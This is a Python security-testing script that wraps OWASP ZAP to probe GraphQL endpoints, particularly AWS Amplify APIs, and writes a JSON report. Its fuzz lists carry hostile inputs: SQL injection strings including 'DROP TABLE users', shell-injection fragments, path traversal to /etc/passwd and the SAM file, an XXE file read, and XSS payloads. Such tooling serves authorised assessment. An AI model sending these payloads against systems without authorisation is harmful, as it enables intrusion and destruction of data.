#!/usr/bin/env python3
"""
OWASP ZAP GraphQL Scanner for AWS Amplify APIs
Automated security testing for GraphQL endpoints with focus on AWS Amplify
"""

import os
import sys
import json
import time
import argparse
from typing import Dict, List, Optional
from zapv2 import ZAPv2
import requests
from datetime import datetime

class ZAPGraphQLScanner:
    def __init__(self, zap_url: str = 'http://localhost:8080', api_key: str = None):
        self.zap_url = zap_url
        self.api_key = api_key or 'changeMe'
        self.zap = ZAPv2(apikey=self.api_key, proxies={'http': zap_url, 'https': zap_url})
        self.session = requests.Session()
        self.graphql_endpoints = []
        self.cognito_tokens = {}
        
    def setup_context(self, context_name: str, target_url: str) -> str:
        """Setup ZAP context for the target"""
        print(f"[*] Setting up context: {context_name}")
        
        # Create new context
        context_id = self.zap.context.new_context(context_name)
        
        # Include target in context
        self.zap.context.include_in_context(context_name, f"{target_url}.*")
        
        # Set context in scope
        self.zap.context.set_context_in_scope(context_name, True)
        
        print(f"[+] Context created with ID: {context_id}")
        return context_id
    
    def import_graphql_schema(self, endpoint: str, schema_file: str = None, introspection: bool = True):
        """Import GraphQL schema for testing"""
        print(f"[*] Importing GraphQL schema for {endpoint}")
        
        if introspection:
            # Perform introspection query
            introspection_query = """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        ...FullType
                    }
                }
            }
            
            fragment FullType on __Type {
                kind
                name
                description
                fields(includeDeprecated: true) {
                    name
                    description
                    args {
                        ...InputValue
                    }
                    type {
                        ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                }
                inputFields {
                    ...InputValue
                }
                interfaces {
                    ...TypeRef
                }
                enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                }
                possibleTypes {
                    ...TypeRef
                }
            }
            
            fragment InputValue on __InputValue {
                name
                description
                type { ...TypeRef }
                defaultValue
            }
            
            fragment TypeRef on __Type {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                        }
                    }
                }
            }
            """
            
            headers = {'Content-Type': 'application/json'}
            if self.cognito_tokens.get('access_token'):
                headers['Authorization'] = f"Bearer {self.cognito_tokens['access_token']}"
            
            response = self.session.post(
                endpoint,
                json={'query': introspection_query},
                headers=headers
            )
            
            if response.status_code == 200:
                schema = response.json()
                print("[+] GraphQL introspection successful")
                self.analyze_graphql_schema(schema)
                return schema
            else:
                print(f"[-] Introspection failed: {response.text}")
                
        elif schema_file:
            # Load schema from file
            with open(schema_file, 'r') as f:
                schema = json.load(f)
            print(f"[+] Schema loaded from {schema_file}")
            return schema
        
        return None
    
    def analyze_graphql_schema(self, schema: Dict):
        """Analyze GraphQL schema for security issues"""
        print("[*] Analyzing GraphQL schema for security issues...")
        
        issues = []
        
        if 'data' in schema and '__schema' in schema['data']:
            schema_data = schema['data']['__schema']
            
            # Check for dangerous mutations
            if schema_data.get('mutationType'):
                mutation_type = schema_data['mutationType']['name']
                print(f"[*] Mutation type: {mutation_type}")
                
                # Look for dangerous mutations
                dangerous_mutations = [
                    'deleteUser', 'deleteAllUsers', 'resetDatabase',
                    'executeCommand', 'runQuery', 'updateRole'
                ]
                
                for type_def in schema_data.get('types', []):
                    if type_def['name'] == mutation_type:
                        for field in type_def.get('fields', []):
                            field_name = field['name']
                            if any(danger in field_name.lower() for danger in dangerous_mutations):
                                issues.append(f"Potentially dangerous mutation: {field_name}")
                                print(f"[!] Dangerous mutation found: {field_name}")
            
            # Check for information disclosure
            sensitive_types = ['User', 'Account', 'Payment', 'Token', 'Secret']
            for type_def in schema_data.get('types', []):
                type_name = type_def['name']
                if any(sensitive in type_name for sensitive in sensitive_types):
                    # Check if type exposes sensitive fields
                    for field in type_def.get('fields', []):
                        field_name = field['name']
                        if any(s in field_name.lower() for s in ['password', 'secret', 'token', 'key']):
                            issues.append(f"Sensitive field exposed: {type_name}.{field_name}")
                            print(f"[!] Sensitive field: {type_name}.{field_name}")
        
        return issues
    
    def test_graphql_vulnerabilities(self, endpoint: str):
        """Test for common GraphQL vulnerabilities"""
        print(f"[*] Testing GraphQL vulnerabilities at {endpoint}")
        
        vulnerabilities = []
        
        # Test 1: Query Depth Attack
        print("[*] Testing query depth attack...")
        depth_query = self.generate_depth_attack_query(10)
        response = self.execute_graphql_query(endpoint, depth_query)
        if response and response.status_code == 200:
            if 'errors' not in response.json():
                vulnerabilities.append("No query depth limit detected")
                print("[!] Vulnerable to query depth attack")
        
        # Test 2: Batching Attack
        print("[*] Testing batching attack...")
        batch_queries = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"}
        ] * 10  # 30 queries
        
        response = self.session.post(
            endpoint,
            json=batch_queries,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            vulnerabilities.append("Query batching enabled without limits")
            print("[!] Vulnerable to batching attack")
        
        # Test 3: Introspection in Production
        print("[*] Testing introspection availability...")
        introspection_query = "{ __schema { queryType { name } } }"
        response = self.execute_graphql_query(endpoint, introspection_query)
        if response and response.status_code == 200:
            if '__schema' in response.json().get('data', {}):
                vulnerabilities.append("Introspection enabled in production")
                print("[!] Introspection is enabled")
        
        # Test 4: Field Suggestion Abuse
        print("[*] Testing field suggestion...")
        suggestion_query = '{ usr { id } }'  # Typo to trigger suggestions
        response = self.execute_graphql_query(endpoint, suggestion_query)
        if response and 'Did you mean' in response.text:
            vulnerabilities.append("Field suggestions enabled (information disclosure)")
            print("[!] Field suggestions enabled")
        
        # Test 5: Alias Abuse
        print("[*] Testing alias abuse...")
        alias_query = "{ " + " ".join([f"a{i}: __typename" for i in range(100)]) + " }"
        response = self.execute_graphql_query(endpoint, alias_query)
        if response and response.status_code == 200:
            vulnerabilities.append("No alias limit detected")
            print("[!] Vulnerable to alias abuse")
        
        # Test 6: SQL Injection in Arguments
        print("[*] Testing SQL injection...")
        sqli_payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1' UNION SELECT * FROM users--"
        ]
        
        for payload in sqli_payloads:
            query = f'{{ user(id: "{payload}") {{ id name }} }}'
            response = self.execute_graphql_query(endpoint, query)
            if response and 'error' in response.text.lower() and 'sql' in response.text.lower():
                vulnerabilities.append(f"Potential SQL injection with payload: {payload}")
                print(f"[!] Potential SQL injection: {payload}")
        
        # Test 7: NoSQL Injection
        print("[*] Testing NoSQL injection...")
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}'
        ]
        
        for payload in nosql_payloads:
            query = f'{{ users(filter: {payload}) {{ id }} }}'
            response = self.execute_graphql_query(endpoint, query)
            if response and response.status_code == 200:
                data = response.json().get('data', {})
                if data and 'users' in data and len(data['users']) > 0:
                    vulnerabilities.append(f"Potential NoSQL injection: {payload}")
                    print(f"[!] Potential NoSQL injection: {payload}")
        
        return vulnerabilities
    
    def test_aws_amplify_specific(self, endpoint: str):
        """Test AWS Amplify specific vulnerabilities"""
        print("[*] Testing AWS Amplify specific issues...")
        
        amplify_issues = []
        
        # Test 1: Cognito User Pool Enumeration
        print("[*] Testing user enumeration...")
        test_users = ['admin', 'test', 'user', 'demo']
        for username in test_users:
            query = f'''
            mutation {{
                signIn(username: "{username}", password: "wrong") {{
                    token
                }}
            }}
            '''
            response = self.execute_graphql_query(endpoint, query)
            if response and 'User does not exist' in response.text:
                amplify_issues.append(f"User enumeration possible: {username} confirmed not to exist")
                print(f"[!] User enumeration: {username}")
        
        # Test 2: S3 Bucket Access
        print("[*] Testing S3 bucket access...")
        query = '''
        query {
            getS3Objects {
                key
                url
                bucket
            }
        }
        '''
        response = self.execute_graphql_query(endpoint, query)
        if response and response.status_code == 200:
            data = response.json().get('data', {})
            if 'getS3Objects' in data:
                amplify_issues.append("S3 bucket contents exposed via GraphQL")
                print("[!] S3 bucket enumeration possible")
        
        # Test 3: DynamoDB Scan
        print("[*] Testing DynamoDB access...")
        query = '''
        query {
            listItems(limit: 1000) {
                items {
                    id
                }
            }
        }
        '''
        response = self.execute_graphql_query(endpoint, query)
        if response and response.status_code == 200:
            data = response.json().get('data', {})
            if 'listItems' in data and len(data['listItems'].get('items', [])) > 100:
                amplify_issues.append("Large data exposure via DynamoDB scan")
                print("[!] DynamoDB scan without pagination limit")
        
        # Test 4: Lambda Function Invocation
        print("[*] Testing Lambda invocation...")
        query = '''
        mutation {
            invokeLambda(functionName: "test", payload: "{}") {
                result
            }
        }
        '''
        response = self.execute_graphql_query(endpoint, query)
        if response and 'AccessDeniedException' not in response.text:
            amplify_issues.append("Lambda functions may be invocable via GraphQL")
            print("[!] Lambda invocation possible")
        
        return amplify_issues
    
    def generate_depth_attack_query(self, depth: int) -> str:
        """Generate a nested query for depth attack"""
        query = "{ user { posts"
        for _ in range(depth):
            query += " { comments"
        for _ in range(depth):
            query += " }"
        query += " } }"
        return query
    
    def execute_graphql_query(self, endpoint: str, query: str) -> requests.Response:
        """Execute a GraphQL query"""
        headers = {'Content-Type': 'application/json'}
        
        # Add authentication if available
        if self.cognito_tokens.get('access_token'):
            headers['Authorization'] = f"Bearer {self.cognito_tokens['access_token']}"
        
        try:
            response = self.session.post(
                endpoint,
                json={'query': query} if isinstance(query, str) else query,
                headers=headers,
                timeout=10
            )
            return response
        except Exception as e:
            print(f"[-] Query execution failed: {e}")
            return None
    
    def set_cognito_tokens(self, tokens: Dict):
        """Set Cognito tokens for authenticated testing"""
        self.cognito_tokens = tokens
        print("[+] Cognito tokens configured for authenticated testing")
    
    def fuzz_graphql_inputs(self, endpoint: str, schema: Dict):
        """Fuzz GraphQL inputs with various payloads"""
        print("[*] Fuzzing GraphQL inputs...")
        
        fuzz_payloads = [
            # XSS payloads
            '<script>alert(1)</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            
            # SQL injection
            "' OR '1'='1",
            "1; DROP TABLE users--",
            
            # Command injection
            '; ls -la',
            '| whoami',
            '`id`',
            
            # Path traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            
            # XXE
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            
            # LDAP injection
            '*)(uid=*',
            'admin*)(|(objectclass=*',
            
            # Format string
            '%s%s%s%s%s',
            '%x%x%x%x',
            
            # Buffer overflow
            'A' * 10000,
            
            # Unicode
            '\u0000',
            '\uffff'
        ]
        
        vulnerabilities = []
        
        if 'data' in schema and '__schema' in schema['data']:
            schema_data = schema['data']['__schema']
            
            # Find query fields
            for type_def in schema_data.get('types', []):
                if type_def['name'] == schema_data.get('queryType', {}).get('name'):
                    for field in type_def.get('fields', []):
                        field_name = field['name']
                        
                        # Test each field with payloads
                        for payload in fuzz_payloads:
                            # Build query with payload
                            if field.get('args'):
                                # Field has arguments
                                arg_name = field['args'][0]['name']
                                query = f'{{ {field_name}({arg_name}: "{payload}") {{ id }} }}'
                            else:
                                # Field has no arguments
                                continue
                            
                            response = self.execute_graphql_query(endpoint, query)
                            
                            if response:
                                # Check for vulnerability indicators
                                response_text = response.text.lower()
                                
                                if 'error' in response_text:
                                    if 'sql' in response_text:
                                        vulnerabilities.append(f"SQL error in {field_name} with: {payload[:20]}...")
                                    elif 'undefined' in response_text or 'cannot read' in response_text:
                                        vulnerabilities.append(f"JavaScript error in {field_name}")
                                    elif 'command' in response_text:
                                        vulnerabilities.append(f"Command injection in {field_name}")
                                
                                # Check if payload is reflected
                                if payload in response.text:
                                    vulnerabilities.append(f"Payload reflected in {field_name}: {payload[:20]}...")
        
        return vulnerabilities
    
    def run_active_scan(self, target_url: str):
        """Run ZAP active scan on GraphQL endpoint"""
        print(f"[*] Starting ZAP active scan on {target_url}")
        
        # Spider the target first
        print("[*] Spidering target...")
        scan_id = self.zap.spider.scan(target_url)
        
        # Wait for spider to complete
        while int(self.zap.spider.status(scan_id)) < 100:
            time.sleep(2)
        
        print("[+] Spider complete")
        
        # Start active scan
        print("[*] Starting active scan...")
        scan_id = self.zap.ascan.scan(target_url)
        
        # Monitor scan progress
        while int(self.zap.ascan.status(scan_id)) < 100:
            progress = self.zap.ascan.status(scan_id)
            print(f"[*] Scan progress: {progress}%")
            time.sleep(5)
        
        print("[+] Active scan complete")
        
        # Get alerts
        alerts = self.zap.core.alerts(baseurl=target_url)
        
        return alerts
    
    def generate_report(self, endpoint: str, vulnerabilities: List, output_file: str = None):
        """Generate security report"""
        print("[*] Generating security report...")
        
        timestamp = datetime.now().isoformat()
        
        report = {
            'scan_info': {
                'endpoint': endpoint,
                'timestamp': timestamp,
                'tool': 'OWASP ZAP GraphQL Scanner'
            },
            'vulnerabilities': {
                'graphql_specific': [],
                'aws_amplify': [],
                'injection': [],
                'authentication': [],
                'other': []
            },
            'summary': {
                'total_issues': len(vulnerabilities),
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }
        
        # Categorize vulnerabilities
        for vuln in vulnerabilities:
            vuln_lower = vuln.lower()
            
            if 'graphql' in vuln_lower or 'introspection' in vuln_lower or 'depth' in vuln_lower:
                report['vulnerabilities']['graphql_specific'].append(vuln)
            elif 'amplify' in vuln_lower or 's3' in vuln_lower or 'dynamodb' in vuln_lower:
                report['vulnerabilities']['aws_amplify'].append(vuln)
            elif 'injection' in vuln_lower or 'sqli' in vuln_lower:
                report['vulnerabilities']['injection'].append(vuln)
            elif 'auth' in vuln_lower or 'token' in vuln_lower:
                report['vulnerabilities']['authentication'].append(vuln)
            else:
                report['vulnerabilities']['other'].append(vuln)
        
        # Save report
        if not output_file:
            output_file = f"zap_graphql_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {output_file}")
        
        return report

def main():
    parser = argparse.ArgumentParser(description='OWASP ZAP GraphQL Scanner')
    parser.add_argument('endpoint', help='GraphQL endpoint URL')
    parser.add_argument('--zap-url', default='http://localhost:8080',
                       help='ZAP proxy URL')
    parser.add_argument('--api-key', help='ZAP API key')
    parser.add_argument('--schema', help='GraphQL schema file')
    parser.add_argument('--token', help='JWT access token')
    parser.add_argument('--introspection', action='store_true',
                       help='Perform introspection')
    parser.add_argument('--fuzz', action='store_true',
                       help='Perform input fuzzing')
    parser.add_argument('--active-scan', action='store_true',
                       help='Run ZAP active scan')
    parser.add_argument('--output', help='Output report file')
    
    args = parser.parse_args()
    
    scanner = ZAPGraphQLScanner(args.zap_url, args.api_key)
    
    # Set authentication token if provided
    if args.token:
        scanner.set_cognito_tokens({'access_token': args.token})
    
    vulnerabilities = []
    
    # Import schema
    schema = scanner.import_graphql_schema(
        args.endpoint,
        args.schema,
        args.introspection
    )
    
    # Test GraphQL vulnerabilities
    vulns = scanner.test_graphql_vulnerabilities(args.endpoint)
    vulnerabilities.extend(vulns)
    
    # Test AWS Amplify specific issues
    amplify_vulns = scanner.test_aws_amplify_specific(args.endpoint)
    vulnerabilities.extend(amplify_vulns)
    
    # Fuzz inputs if requested
    if args.fuzz and schema:
        fuzz_vulns = scanner.fuzz_graphql_inputs(args.endpoint, schema)
        vulnerabilities.extend(fuzz_vulns)
    
    # Run active scan if requested
    if args.active_scan:
        alerts = scanner.run_active_scan(args.endpoint)
        for alert in alerts:
            vulnerabilities.append(f"{alert['name']}: {alert['description']}")
    
    # Generate report
    scanner.generate_report(args.endpoint, vulnerabilities, args.output)
    
    print(f"\n[+] Scan complete. Found {len(vulnerabilities)} issues")

if __name__ == "__main__":
    main()